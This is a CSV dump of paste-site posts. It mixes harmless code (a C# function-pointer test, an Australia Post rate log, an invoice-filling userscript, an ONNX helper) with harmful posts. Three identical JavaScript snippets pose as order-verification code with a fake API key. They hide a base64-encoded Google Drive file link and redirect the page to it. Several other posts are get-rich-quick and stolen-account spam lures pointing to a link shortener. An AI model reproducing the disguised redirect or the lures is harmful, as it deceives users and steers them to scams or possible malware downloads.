id,title,username,language,date,content
G1TMDTxH,Untitled,bruhmanuser91roblox,JavaScript,Sunday 23rd of March 2025 12:46:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/554/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
czFGFZ9Y,Random Gmail Acc EB,hovnoneznam,JavaScript,Sunday 23rd of March 2025 12:45:21 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

rizMgt50QI
"
VuXZebZ4,Make $1000 15-MINUTES (BEGINNER) L8,hovnoneznam,JavaScript,Sunday 23rd of March 2025 12:43:16 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

P9aoQl4lAy
"
ftJVPDZt,what,whitelava3203,C#,Sunday 23rd of March 2025 12:43:06 AM CDT,"using System.Reflection;

public interface IMyInterface
{
    void MyFunction();
}

public struct MyStruct : IMyInterface
{
    public void MyFunction() => Console.WriteLine(""Hello World!"");
}

public unsafe class Program
{
    const int TestMode = 1;
    public static void Main()
    {
        MyStruct instance = default;
        MyStruct* ptr = &instance;
        MethodInfo method = typeof(MyStruct).GetMethod(""MyFunction"");
        delegate*<void*, void> func1 = (delegate*<void*, void>)method.MethodHandle.GetFunctionPointer();

        switch (TestMode)
        {
            case 1:
                func1(ptr); //System.ExecutionEngineException: 'Exception of type 'System.ExecutionEngineException' was thrown.'
                break;
            case 2:
                func1((void*)1); //System.ExecutionEngineException: 'Exception of type 'System.ExecutionEngineException' was thrown.'
                break;
            case 3:
                func1((void*)0); //no error
                func1(ptr); //no error
                break;
        }
    }
}"
xUZKj9Jp,Aus Post Debug,Evenstephen,JSON,Sunday 23rd of March 2025 12:42:23 AM CDT,"Array ( [1] => Array ( [weight] => 5.35 [length] => 66.5 [height] => 16 [width] => 29 [quantity] => 1 [name] => Box #11 [postcode] => 3200 ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=29&height=16&weight=5.35&service_code=AUS_PARCEL_REGULAR

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Parcel Post [delivery_time] => Delivered in 2-3 business days [total_cost] => 23.45 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Parcel Post [cost] => 23.45 ) ) ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=29&height=16&weight=5.35&service_code=AUS_PARCEL_EXPRESS

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Express Post [delivery_time] => Guaranteed Next Business Day within the Express Post network (If posted on any business day Monday to Friday in accordance with the conditions set out on the item). [total_cost] => 32.25 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Express Post [cost] => 32.25 ) ) ) )

Packing Details: Array ( [1] => Array ( [weight] => 10.7 [length] => 66.5 [height] => 29 [width] => 32 [quantity] => 2 [name] => Box #19 [postcode] => 3200 ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=32&height=29&weight=10.7&service_code=AUS_PARCEL_REGULAR

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Parcel Post [delivery_time] => Delivered in 2-3 business days [total_cost] => 25.05 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Parcel Post [cost] => 25.05 ) ) ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=32&height=29&weight=10.7&service_code=AUS_PARCEL_EXPRESS

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Express Post [delivery_time] => Guaranteed Next Business Day within the Express Post network (If posted on any business day Monday to Friday in accordance with the conditions set out on the item). [total_cost] => 34.65 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Express Post [cost] => 34.65 ) ) ) )

Packing Details: Array ( [1] => Array ( [weight] => 15.9 [length] => 66.5 [height] => 38 [width] => 40.5 [quantity] => 3 [name] => Box #19 [postcode] => 3200 ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_REGULAR

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Parcel Post [delivery_time] => Delivered in 2-3 business days [total_cost] => 27.05 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Parcel Post [cost] => 27.05 ) ) ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_EXPRESS

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Express Post [delivery_time] => Guaranteed Next Business Day within the Express Post network (If posted on any business day Monday to Friday in accordance with the conditions set out on the item). [total_cost] => 37.65 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Express Post [cost] => 37.65 ) ) ) )

Have a coupon? Click here to enter your code

Packing Details: Array ( [1] => Array ( [weight] => 15.9 [length] => 66.5 [height] => 38 [width] => 40.5 [quantity] => 3 [name] => Box #19 [postcode] => 3200 ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_REGULAR

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Parcel Post [delivery_time] => Delivered in 2-3 business days [total_cost] => 27.05 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Parcel Post [cost] => 27.05 ) ) ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_EXPRESS

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Express Post [delivery_time] => Guaranteed Next Business Day within the Express Post network (If posted on any business day Monday to Friday in accordance with the conditions set out on the item). [total_cost] => 37.65 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Express Post [cost] => 37.65 ) ) ) )

Packing Details: Array ( [1] => Array ( [weight] => 15.9 [length] => 66.5 [height] => 38 [width] => 40.5 [quantity] => 3 [name] => Box #19 [postcode] => 3200 ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_REGULAR

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Parcel Post [delivery_time] => Delivered in 2-3 business days [total_cost] => 27.05 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Parcel Post [cost] => 27.05 ) ) ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_EXPRESS

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Express Post [delivery_time] => Guaranteed Next Business Day within the Express Post network (If posted on any business day Monday to Friday in accordance with the conditions set out on the item). [total_cost] => 37.65 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Express Post [cost] => 37.65 ) ) ) )

Packing Details: Array ( [1] => Array ( [weight] => 15.9 [length] => 66.5 [height] => 38 [width] => 40.5 [quantity] => 3 [name] => Box #19 [postcode] => 3200 ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_REGULAR

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Parcel Post [delivery_time] => Delivered in 2-3 business days [total_cost] => 27.05 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Parcel Post [cost] => 27.05 ) ) ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_EXPRESS

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Express Post [delivery_time] => Guaranteed Next Business Day within the Express Post network (If posted on any business day Monday to Friday in accordance with the conditions set out on the item). [total_cost] => 37.65 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Express Post [cost] => 37.65 ) ) ) )"
KHpB4dv9,Binance account IL,hovnoneznam,JavaScript,Sunday 23rd of March 2025 12:41:09 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

ufL0K49yhn
"
VtVKsk6G,Make $1000 15-MINUTES (BEGINNER) L8,boy029,JavaScript,Sunday 23rd of March 2025 12:37:32 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

DBY6LGRSQ1
"
AyAfq8q4,Binance account IL,boy029,JavaScript,Sunday 23rd of March 2025 12:35:27 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

Cq9OOLV0Hl
"
mvDDqdds,Untitled,bruhmanuser91roblox,JavaScript,Sunday 23rd of March 2025 12:35:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/276/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wRJNVuRy,EARN $900 INSTANTLY 2025 XN,boy029,JavaScript,Sunday 23rd of March 2025 12:33:23 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

iXWn1VO1Ma
"
agGVpMKy,Untitled,bruhmanuser91roblox,JavaScript,Sunday 23rd of March 2025 12:29:30 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/104/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rc5ivVUw,Flow account menu,riffburn,JavaScript,Sunday 23rd of March 2025 12:25:27 AM CDT,"// ==UserScript==
// @name         Flow Account Menu
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Displays a list of products with amount and extra inputs in a table and submits selected products where amount > 0. Buttons and selected count are placed outside the table.
// @author       You
// @match        *.flowaccount.com/*/business/invoices*
// @grant        GM_addStyle
// @grant        GM_xmlhttpRequest
// ==/UserScript==

(function () {
    'use strict';

    // Create the popup container and style it
    GM_addStyle(`
        #select-popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            border: 2px solid #ccc;
            z-index: 9999;
            display: none;
            width: 700px;
            height: 800px;
            overflow-y: auto;
        }
        #options-table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 10px;
        }
        #options-table th, #options-table td {
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        #options-table th {
            background-color: #f2f2f2;
        }
        .amount-input, .extra-input {
            width: 80px;
            padding: 5px;
            box-sizing: border-box;
        }
        #controls-container {
            position: sticky;
            bottom: 0;
            background: white;
            padding: 10px 0;
            border-top: 1px solid #ccc;
        }
        #selected-count {
            margin-bottom: 10px;
            font-weight: bold;
            font-size: 14px;
            color: #333;
        }
        #submit-selections, #clear-amount, #close-popup {
            margin-right: 10px;
            padding: 5px 10px;
            cursor: pointer;
        }
        #submit-selections:hover {
            background-color: #00cc66;
            color: white;
        }
        #close-popup {
            background: #b71c1c;
            color: white;
            border: none;
        }
        #close-popup:hover {
            background-color: red;
            color: white;
        }
        #clear-amount {
            background: #b71c1c;
            color: white;
            border: none;
        }
        #submit-selections {
            background: green;
            color: white;
            border: none;
        }
        #clear-amount:hover {
            background-color: red;
        }
        #openPopupButton {
            z-index: 99999;
            right: 410px;
            position: fixed;
            padding: 10px 30px;
            font-size: 16px;
            cursor: pointer;
            background-color: #4CAF50;
            color: white;
            border: none;
        }
        #openPopupButton:hover {
            color: white;
            background-color: #45a049;
        }
    `);

    // Create the popup HTML structure
    const popup = document.createElement('div');
    popup.id = 'select-popup';
    popup.innerHTML = `
        <table id=""options-table"">
            <thead>
                <tr>
                    <th>Product</th>
                    <th>Amount</th>
                    <th>Extra</th>
                </tr>
            </thead>
            <tbody id=""options-list""></tbody>
        </table>
        <div id=""controls-container"">
            <div id=""selected-count"">Selected: 0 items | Row: 0 items | Total: 0 items</div>
            <button id=""submit-selections"">Submit</button>
            <button id=""clear-amount"">Clear Amounts</button>
            <button id=""close-popup"">Close</button>
        </div>
    `;
    const openPopupButton = document.createElement('button');
    let lastUrl = location.href;
    const observer = new MutationObserver(() => {
        if (location.href !== lastUrl) {
            lastUrl = location.href;
            onUrlChange();
        }
    });

    observer.observe(document, { subtree: true, childList: true });

    function onUrlChange() {
        if(location.href.includes(""invoices/new"")){
            openPopupButton.style.display = 'block';
        }else{
            openPopupButton.style.display = 'None';
        }
    }

    document.body.appendChild(popup);

    const xpathSelector = '//*[@id=""documentHeader""]/div/div[2]/button'; // '//*[@id=""paper-content""]/section[1]/div[1]/div[3]/fieldset/div[2]/div[3]' //'//*[@id=""documentHeader""]/div/div[2]/button';

    function addButton() {
        // Find the target element using XPath
        const targetElement = document.evaluate(
            xpathSelector,
            document,
            null,
            XPathResult.FIRST_ORDERED_NODE_TYPE,
            null
        ).singleNodeValue;

        if (targetElement) {
            openPopupButton.id = 'openPopupButton';
            openPopupButton.innerText = 'Open Menu';
            openPopupButton.style.borderRadius = '5px';
            //document.body.appendChild(openPopupButton);

            openPopupButton.addEventListener('click', () => {
                popup.style.display = 'block';
            });

            targetElement.parentNode.insertBefore(openPopupButton, targetElement);
            //targetElement.insertAdjacentElement('afterend', openPopupButton);
            onUrlChange();
        }
    }

    // Function to observe the DOM for changes
    function observeDOM() {
        const observer = new MutationObserver(function(mutations) {
            const targetElement = document.evaluate(
                xpathSelector,
                document,
                null,
                XPathResult.FIRST_ORDERED_NODE_TYPE,
                null
            ).singleNodeValue;

            if (targetElement) {
                addButton();
                observer.disconnect();
            }
        });

        observer.observe(document, {
            childList: true,
            subtree: true
        });
    }
    window.addEventListener('load', observeDOM);

    document.getElementById('close-popup').addEventListener('click', () => {
        popup.style.display = 'none';
    });
    document.getElementById('clear-amount').addEventListener('click', () => {
        // Clear all amount and extra input fields
        const amountInputs = document.querySelectorAll('.amount-input');
        const extraInputs = document.querySelectorAll('.extra-input');
        amountInputs.forEach(function(input) {input.value = 0;});
        extraInputs.forEach(function(input) {input.value = 0;});
        updateSelectedCount();
    });

    // Function to simulate typing in an input field
    function simulateTyping(inputElement, value) {
        const event = new Event('input', { 'bubbles': true, 'cancelable': true });
        inputElement.value = value;
        inputElement.dispatchEvent(event);
        inputElement.blur();
    }

    // Function to simulate clicking an input field
    function simulateClick(inputElement) {
        const clickEvent = new MouseEvent('click', { 'bubbles': true, 'cancelable': true });
        inputElement.dispatchEvent(clickEvent);
    }

    // Function to select the first dropdown option
    function selectFirstDropdownOption(inputElement) {
        simulateClick(inputElement);
        setTimeout(() => {
            const dropdownOptions = inputElement.closest('typeahead-custom').querySelectorAll('.tt-suggestion');
            if (dropdownOptions.length > 0) {
                dropdownOptions[0].click();
            }
        }, 1000);
    }

    // Function to process input fields
    document.getElementById('submit-selections').addEventListener('click', () => {
        const selectedProducts = [];
        const amountInputs = document.querySelectorAll('.amount-input');
        const extraInputs = document.querySelectorAll('.extra-input');

        amountInputs.forEach((amountInput, index) => {
            const productName = amountInput.getAttribute('data-product');
            const amountValue = parseInt(amountInput.value, 10) || 0;
            const extraValue = parseInt(extraInputs[index].value, 10) || 0;

            if (amountValue > 0 || extraValue > 0) {
                selectedProducts.push({
                    product: productName,
                    amount: amountValue,
                    extra: extraValue
                });
            }
        });

        if (selectedProducts.length == 0) {
            alert('0 items');
            return;
        }
        popup.style.display = 'None';

        let inputIndex = 1;
        let selectedProductIndex = 0;

        function processNextInput() {
            /*if (selectedProductIndex >= selectedProducts.length) {
                popup.style.display = 'none';
                return;
            }*/

            const selectedProduct = selectedProducts[selectedProductIndex];

            // Skip if amount = 0 and extra = 0
            if (selectedProduct.amount === 0 && selectedProduct.extra === 0) {
                selectedProductIndex++;
                setTimeout(processNextInput, 1000); // Move to the next product
                return;
            }

            const rowXPath = `//*[@id=""not-batch-document-table""]/flowaccount-product-item-table/table/tbody/tr[${inputIndex}]`;
            const inputXPath = `${rowXPath}/td[3]/typeahead-custom/div/div[1]/span/input`;
            const amountXPath = `${rowXPath}/td[4]/input`;
            const priceXPath = `${rowXPath}/td[6]/input`;
            const addButtonXPath = `//*[@id=""paper-content""]/section[2]/div/div/section[1]/button`;

            const productInput = document.evaluate(inputXPath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
            const amountInput = document.evaluate(amountXPath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
            const priceInput = document.evaluate(priceXPath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
            const addButton = document.evaluate(addButtonXPath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;

            if (!productInput) {
                handleMissingProductInput(addButton);
                return;
            }

            if (productInput.value.trim() !== """") {
                inputIndex++;
                setTimeout(processNextInput, 300);
                return;
            }

            // Process main row if amount > 0
            if (selectedProduct.amount > 0) {
                processMainRow(selectedProduct, productInput, amountInput, priceInput, addButton);
            } else if (selectedProduct.extra > 0) {
                processExtraRowOnly(selectedProduct, productInput, amountInput, priceInput, addButton);
            }
        }

        function handleMissingProductInput(addButton) {
            if (addButton) {
                addButton.click();
                setTimeout(processNextInput, 200); // Wait 1 sec before retrying
            } else {
                console.log(""Add button not found!"");
            }
        }

        function processMainRow(selectedProduct, productInput, amountInput, priceInput, addButton) {
            simulateTyping(productInput, selectedProduct.product);
            selectFirstDropdownOption(productInput);

            setTimeout(() => {
                if (amountInput) {
                    simulateTyping(amountInput, selectedProduct.amount);
                    amountInput.focus();
                    const changeEvent = new Event('change', { bubbles: true, cancelable: true });
                    amountInput.dispatchEvent(changeEvent);
                }

                // If extra > 0, add a new row for the extra amount
                if (selectedProduct.extra > 0) {
                    addNewRowForExtra(selectedProduct, addButton);
                } else {
                    selectedProductIndex++;
                    setTimeout(processNextInput, 200); // Move to the next product
                }
            }, 1000); // Wait 1 second before processing amount and price
        }

        function processExtraRowOnly(selectedProduct, productInput, amountInput, priceInput, addButton) {
            simulateTyping(productInput, selectedProduct.product);
            selectFirstDropdownOption(productInput);

            setTimeout(() => {
                if (amountInput) {
                    simulateTyping(amountInput, selectedProduct.extra);
                    amountInput.focus();
                    const changeEvent = new Event('change', { bubbles: true, cancelable: true });
                    amountInput.dispatchEvent(changeEvent);
                }

                // Set price to 0 for the extra row
                if (priceInput) {
                    simulateTyping(priceInput, 0);
                    priceInput.focus();
                    const priceChangeEvent = new Event('change', { bubbles: true, cancelable: true });
                    priceInput.dispatchEvent(priceChangeEvent);
                }

                selectedProductIndex++;
                setTimeout(processNextInput, 200); // Move to the next product
            }, 1000); // Wait 1 second before processing the extra row
        }

        function addNewRowForExtra(selectedProduct, addButton) {
            setTimeout(() => {
                if (addButton) {
                    addButton.click();
                }

                inputIndex++;

                // Process the new row for the extra amount
                setTimeout(() => {
                    const newRowXPath = `//*[@id=""not-batch-document-table""]/flowaccount-product-item-table/table/tbody/tr[${inputIndex}]`;
                    const newProductInput = document.evaluate(`${newRowXPath}/td[3]/typeahead-custom/div/div[1]/span/input`, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
                    const newAmountInput = document.evaluate(`${newRowXPath}/td[4]/input`, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
                    const newPriceInput = document.evaluate(`${newRowXPath}/td[6]/input`, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;

                    if (newProductInput && newAmountInput && newPriceInput) {
                        simulateTyping(newProductInput, selectedProduct.product);
                        selectFirstDropdownOption(newProductInput);

                        setTimeout(() => {
                            simulateTyping(newAmountInput, selectedProduct.extra);
                            newAmountInput.focus();
                            const changeEvent = new Event('change', { bubbles: true, cancelable: true });
                            newAmountInput.dispatchEvent(changeEvent);

                            simulateTyping(newPriceInput, 0);
                            newPriceInput.focus();
                            const priceChangeEvent = new Event('change', { bubbles: true, cancelable: true });
                            newPriceInput.dispatchEvent(priceChangeEvent);

                            selectedProductIndex++;
                            setTimeout(processNextInput, 200); // Move to the next product
                        }, 1000); // Wait 1 second before filling the new row
                    }
                }, 1000); // Wait 1 second before processing the new row
            }, 1000); // Wait 1 second before adding the new row
        }
        processNextInput();
    });

    // Fetch product list from Pastebin and populate UI
    GM_xmlhttpRequest({
        method: ""GET"",
        url: ""https://pastebin.com/raw/dccXXx1L"",
        overrideMimeType: ""text/plain; charset=utf-8"",
        onload: function (response) {
            let rawText = response.responseText;
            let productList = rawText
                .replace(/\r\n/g, ""\n"")
                .split(""\n"")
                .map(item => item.trim())
                .filter(item => item.length > 0);

            const optionsList = document.getElementById('options-list');
            optionsList.innerHTML = """";

            productList.forEach(product => {
                const row = document.createElement('tr');

                const productCell = document.createElement('td');
                productCell.textContent = product;

                const amountCell = document.createElement('td');
                const amountInput = document.createElement('input');
                amountInput.type = 'number';
                amountInput.placeholder = 'Amount';
                amountInput.className = 'amount-input';
                amountInput.min = '0';
                amountInput.value = '0';
                amountInput.setAttribute('data-product', product);
                amountInput.addEventListener('input', updateSelectedCount);
                amountCell.appendChild(amountInput);

                const extraCell = document.createElement('td');
                const extraInput = document.createElement('input');
                extraInput.type = 'number';
                extraInput.placeholder = 'Extra';
                extraInput.className = 'extra-input';
                extraInput.min = '0';
                extraInput.value = '0';
                extraInput.setAttribute('data-product', product);
                extraInput.addEventListener('input', updateSelectedCount);
                extraCell.appendChild(extraInput);

                row.appendChild(productCell);
                row.appendChild(amountCell);
                row.appendChild(extraCell);
                optionsList.appendChild(row);
            });
        },
        onerror: function (error) {
            console.error('Error fetching product list:', error);
        }
    });

    // Function to update selected count
    function updateSelectedCount() {
        const amountInputs = document.querySelectorAll('.amount-input');
        const extraInputs = document.querySelectorAll('.extra-input');

        let selectedCount = 0; // Number of selected items (amount > 0 or extra > 0)
        let rowCount = 0; // Number of rows used (main + extra rows)
        let totalItems = 0; // Total of amount + extra for all selected items

        amountInputs.forEach((amountInput, index) => {
            const amountValue = parseInt(amountInput.value, 10) || 0;
            const extraValue = parseInt(extraInputs[index].value, 10) || 0;

            if (amountValue > 0 || extraValue > 0) {
                selectedCount++; // Count selected items
                totalItems += amountValue + extraValue; // Add to total

                // Count rows:
                // - 1 row for amount > 0
                // - 1 additional row for extra > 0
                if (amountValue > 0) rowCount++;
                if (extraValue > 0) rowCount++;
            }
        });

        // Update the display
        document.getElementById('selected-count').innerText = `Selected: ${selectedCount} items | Row: ${rowCount} items | Total: ${totalItems} items`;
    }
})();"
Da3rhENJ,provider_manager.py,RahulHarpal,Python,Sunday 23rd of March 2025 12:25:05 AM CDT,"# app/utils/provider_manager.py
def get_available_providers():
    """"""Detect and return available execution providers in priority order""""""
    available = onnxruntime.get_available_providers()
    
    # Define provider priority
    provider_priority = [
        ""CUDAExecutionProvider"",      # NVIDIA GPUs
        ""ROCMExecutionProvider"",      # AMD GPUs
        ""CoreMLExecutionProvider"",    # Apple Neural Engine
        ""TensorrtExecutionProvider"",  # TensorRT optimization
        ""CPUExecutionProvider""        # Fallback option
    ]
    
    # Return providers in priority order if available
    return [p for p in provider_priority if p in available]

def get_provider_config(provider_name):
    """"""Return optimized configuration for specific providers""""""
    configs = {
        ""CUDAExecutionProvider"": {
            ""device_id"": 0,
            ""arena_extend_strategy"": ""kNextPowerOfTwo"",
            ""gpu_mem_limit"": 2 * 1024 * 1024 * 1024,
            ""cudnn_conv_algo_search"": ""EXHAUSTIVE""
        },
        ""ROCMExecutionProvider"": {
            ""device_id"": 0,
            ""tunable_op_enable"": True
        },
        ""CoreMLExecutionProvider"": {
            ""enable_on_subgraph"": True
        }
    }
    return configs.get(provider_name, {})"
